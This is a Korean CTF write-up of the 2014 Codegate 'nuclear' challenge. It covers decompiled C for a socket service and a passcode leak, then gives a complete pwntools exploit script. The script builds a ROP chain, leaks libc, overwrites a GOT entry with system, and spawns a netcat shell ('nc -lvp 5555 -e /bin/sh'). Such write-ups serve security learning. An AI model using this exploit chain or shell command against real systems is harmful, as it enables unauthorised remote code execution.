---
title: "2014 Codegate nuclear"
date: 2020-1-18
tags: [Codegate]
categories: [Codegate]
---

32비트 바이너리고 소켓짜놨다. 포트는 1129로 열어놨다. 보호기법은 Partial RELRO, NX만 걸려있다.

```c
int __cdecl sub_8048C65(void *arg)
{
  int result; // eax
  pthread_t newthread; // [esp+1Ch] [ebp-23Ch]
  char s1; // [esp+20h] [ebp-238h]
  int v4; // [esp+220h] [ebp-38h]
  char v5[4]; // [esp+224h] [ebp-34h]
  char s; // [esp+228h] [ebp-30h]
  int v7; // [esp+248h] [ebp-10h]
  FILE *stream; // [esp+24Ch] [ebp-Ch]

  *v5 = 0;
  v4 = 0;
  memset(&s, 0, 0x20u);
  stream = fopen("THIS_IS_NOT_KEY_JUST_PASSCODE", "r");
  if ( !stream )
  {
    puts("opening passcode error!");
    exit(0);
  }
  fread(&s, 0x20u, 1u, stream);
  fclose(stream);
  sub_8048A0D(arg, "\n\n:: Welcome to the Nuclear Control System ::\n\n");
  while ( 1 )
  {
    memset(&s1, 0, 0x200u);
    sub_8048A0D(arg, "> ");
    result = sub_8048A6F(arg, &s1, 0x200u);
    v7 = result;
    if ( result <= 0 )
      break;
    result = strncmp(&s1, "quit", 4u);
    if ( !result )
      break;
    if ( !strncmp(&s1, "target", 6u) )
    {
      sub_8048A0D(arg, "[+] Enter coordinate of target, (Latitude/Longitude)\n---> ");
      memset(&s1, 0, 0x200u);
      result = sub_8048A6F(arg, &s1, 0x200u);
      v7 = result;
      if ( result <= 0 )
        return result;
      __isoc99_sscanf(&s1, "%f/%f", v5, &v4);
      sub_8048A0D(arg, "[+] Target coordinate setting completed.\n");
    }
    else if ( !strncmp(&s1, "launch", 6u) )
    {
      sub_8048A0D(arg, "[+] Enter the passcode to launch the nuclear : ");
      memset(&s1, 0, 0x200u);
      result = sub_8048A6F(arg, &s1, 0x200u);
      v7 = result;
      if ( result <= 0 )
        return result;
      if ( strcmp(&s, &s1) )
        return sub_8048A0D(arg, "[!] the passcode is not correct.\n");
      memset(&s1, 0, 0x200u);
      sub_8048A0D(arg, "[+] Correct passcode!\n");
      pthread_create(&newthread, 0, sub_8048B9C, arg);
      pthread_join(newthread, 0);
    }
    else
    {
      sub_8048A0D(arg, "[!] Unknown command : %s\n", &s1);
    }
  }
  return result;
}
```

s에 있는 값을 leak해야해서 v4,v5값을 채워주고 leak해주면 된다. 그러면 passcode알 수 있고 스레드 함수 내부에 `start_routine` 에서 취약점 터지는데 여기서 체이닝해주고 리버스쉘 열어주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
e = ELF('./nuclear')
p = remote('localhost',1129)
libc = ELF('/lib/i386-linux-gnu/libpthread.so.0')
libc2 = ELF('/lib/i386-linux-gnu/libc.so.6')
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
p4r = 0x0804917c # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
start_routine = 0x8048b5b

sla('>','target')
sla('--->','0.1/0.1')
sa('>','A'*511 + 'B')
p.recvuntil('B') + p.recv(8)
passcode = p.recv(30).replace('\n','')
log.info('passcode : ' + passcode)
sla('>','launch')
sla(': ',passcode)

payload = 'A'*0x20c + 'A'*4
payload += p32(e.plt['send']) + p32(p4r) + p32(4) + p32(e.got['send']) + p32(4) + p32(0)
payload += p32(e.plt['recv']) + p32(p4r) + p32(4) + p32(e.bss()) + p32(30) + p32(0)
#payload += p32(start_routine)
payload += p32(e.plt['recv']) + p32(p4r) + p32(4) + p32(e.got['recv']) + p32(4) + p32(0)
payload += p32(e.plt['recv']) + 'A'*4 + p32(e.bss())
p.sendafter('100',payload)

send = u32(p.recvuntil('\xf7')[-4:])
libc_base = send - libc.symbols['send']
system = send - 0x18a760
log.info('libc : ' + hex(libc_base))

p.send('nc -lvp 5555 -e /bin/sh\x00')

p.sendline(p32(system))

p.interactive()
```

